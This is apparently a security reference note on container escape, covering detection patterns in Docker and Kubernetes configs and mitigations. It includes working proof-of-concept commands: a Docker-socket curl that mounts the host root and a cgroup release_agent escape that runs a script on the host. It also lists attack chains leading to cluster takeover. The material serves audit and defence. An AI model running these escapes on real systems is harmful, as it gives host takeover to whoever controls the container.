# Container Escape & Hostile Runtime Evolution

**Tags:** #critical #rce #container-escape #docker #kubernetes #privilege-escalation
**OWASP:** A05:2021-Security Misconfiguration
**CVSS Base:** 10.0 (Critical — Host Takeover)

---

## 📖 What is it

Container escape occurs when an attacker with code execution (RCE) inside a container finds a path to break the isolation layer and execute commands on the host operating system. This often involves exploiting misconfigurations in Docker, Kubernetes, or the Linux kernel itself.

---

## 🔍 `grep_search` Tactics (Detection in Configs)

```yaml
privileged: true
hostPID: true
hostNetwork: true
mountPath: /var/run/docker.sock
capabilities: ["SYS_ADMIN"]
securityContext:
  allowPrivilegeEscalation: true
```

---

## 💣 Escape Vector 1: The Docker Socket Mount

If `/var/run/docker.sock` is mounted inside the container, the attacker can use the `docker` binary (or simple `curl` to the socket) to start a new container with the host's root filesystem mounted.

**Proof of Concept:**
```bash
# Inside the container
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create
```

---

## 💣 Escape Vector 2: Privileged Mode & SYS_ADMIN

A container run with `--privileged` has almost all capabilities of the host. The most common escape involves mounting the host's `cgroup` and using the `release_agent`.

**Proof of Concept Snippet:**
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "ps aux > $host_path/output" >> /exploit
chmod +x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# The 'exploit' script now runs on the HOST.
```

---

## 💣 Escape Vector 3: core_pattern Overwrite

If the container has write access to `/proc/sys/kernel/core_pattern`, it can define a program to run when a process crashes. Since this file is shared with the host, the "program" will execute on the host.

**Static Detection:**
Trace if the application has permissions to write to `/proc` or if the container is run with a user that can modify kernel parameters.

---

## 💣 Escape Vector 4: Host Path Injection

If the host's `/` or sensitive directories like `/etc/shadow` or `/root/.ssh` are mounted (even as read-only, sometimes they can be re-mounted as RW if `SYS_ADMIN` is present), the escape is trivial.

---

## 🧪 Validation Script (Post-RCE)

```python
# .tmp/check_escape_path.py
import os

def check():
    path = "/var/run/docker.sock"
    if os.path.exists(path):
        print(f"[CRITICAL] Docker socket found at {path} - Direct escape possible.")
    
    with open('/proc/self/status', 'r') as f:
        for line in f:
            if 'CapEff' in line:
                print(f"[INFO] Effective Capabilities: {line.strip()}")
                # 0000003fffffffff is often a sign of --privileged

check()
```

---

## 🛡️ Fix

1. **Rule of Least Privilege:** Never use `--privileged`.
2. **Drop Capabilities:** `cap_drop: ["ALL"]` and only add what is strictly necessary.
3. **Read-Only Root FS:** Run containers with a read-only filesystem where possible.
4. **No Socket Mounts:** Never mount `docker.sock` in a container exposed to the internet.
5. **Use User Namespaces:** Isolate the container's root user from the host's root user.

---

## 🔗 Chain Exploits

```
LFI  Read /proc/self/mounts  Docker socket mount found  Container Escape
RCE  --privileged container  Host Takeover via release_agent
SSRF  Kubernetes API access  Service Account Token leak  Cluster Takeover
```

---

## 📌 References
- [[iac-security-docker-kubernetes-terraform]]
- [Trail of Bits - Container Escape](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [HackTricks - Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout)
